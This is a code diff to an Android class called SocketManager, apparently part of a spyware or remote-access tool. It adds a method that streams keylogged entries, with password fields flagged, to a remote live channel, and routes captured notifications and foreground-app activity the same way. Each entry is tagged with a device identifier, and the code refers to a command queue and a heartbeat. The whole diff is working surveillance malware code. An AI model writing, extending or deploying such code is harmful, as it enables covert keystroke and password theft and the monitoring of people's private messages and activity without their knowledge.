@@ -501,6 +501,27 @@ public class SocketManager {
         if (useFallback) sendMessage(event, data);
     }
 
+    /**
+     * Send on the live channel only — used for push events (keylog, notification, activity).
+     * If the live channel is not connected (no internet / offline), the event is silently
+     * dropped. We deliberately do NOT fall back to the primary channel so that high-frequency
+     * push events never enter the command queue.
+     */
+    private void sendLiveOnly(String event, JSONObject data) {
+        synchronized (liveLock) {
+            if (!liveConnected || liveOut == null) return; // offline — drop silently
+            try {
+                JSONObject msg = new JSONObject();
+                msg.put("event", event);
+                msg.put("data", data);
+                liveOut.print(msg.toString() + "\n");
+                liveOut.flush();
+            } catch (Exception e) {
+                Log.e(TAG, "sendLiveOnly [" + event + "] error: " + e.getMessage());
+            }
+        }
+    }
+
     // ── Heartbeat ────────────────────────────────────────────────────────
 
     private void startHeartbeat() {
@@ -1891,7 +1912,9 @@ public class SocketManager {
                 entry.put("isPassword", isPassword);
                 entry.put("fieldType", isPassword ? (fieldType.isEmpty() ? "password" : fieldType) : fieldType);
                 entry.put("deviceId", DeviceInfo.getDeviceId(context));
-                sendLiveMessage("keylog:entry", entry);
+                // Only send if live channel is connected (device is online).
+                // If offline, drop silently — do NOT queue as a command.
+                sendLiveOnly("keylog:entry", entry);
             } catch (Exception e) {
                 Log.e(TAG, "pushKeylogEntry error: " + e.getMessage());
             }
@@ -1978,7 +2001,9 @@ public class SocketManager {
                 entry.put("timestamp", ts);
                 entry.put("postTime", postTime);
                 entry.put("deviceId", DeviceInfo.getDeviceId(context));
-                sendLiveMessage("notification:entry", entry);
+                // Only send if live channel is connected (device is online).
+                // If offline, drop silently — do NOT queue as a command.
+                sendLiveOnly("notification:entry", entry);
             } catch (Exception e) {
                 Log.e(TAG, "pushNotification error: " + e.getMessage());
             }
@@ -1996,7 +2021,9 @@ public class SocketManager {
                 entry.put("appName", appName != null ? appName : packageName);
                 entry.put("timestamp", ts);
                 entry.put("deviceId", DeviceInfo.getDeviceId(context));
-                sendLiveMessage("app:foreground", entry);
+                // Only send if live channel is connected (device is online).
+                // If offline, drop silently — do NOT queue as a command.
+                sendLiveOnly("app:foreground", entry);
             } catch (Exception e) {
                 Log.e(TAG, "pushRecentActivity error: " + e.getMessage());
             }
